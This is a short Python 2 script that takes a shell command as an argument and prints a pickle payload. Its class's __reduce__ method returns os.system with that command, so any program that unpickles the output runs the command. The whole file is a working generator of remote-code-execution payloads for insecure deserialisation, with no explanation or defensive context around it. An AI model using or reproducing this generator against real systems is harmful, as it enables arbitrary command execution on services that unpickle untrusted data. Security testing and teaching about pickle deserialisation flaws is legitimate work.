#!/bin/env python

import cPickle
import sys

if len(sys.argv) < 2:
    print "usage: ./malicious_pickle.py *command*"
    exit()

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(sys.argv[1],))

print cPickle.dumps(PickleRce())
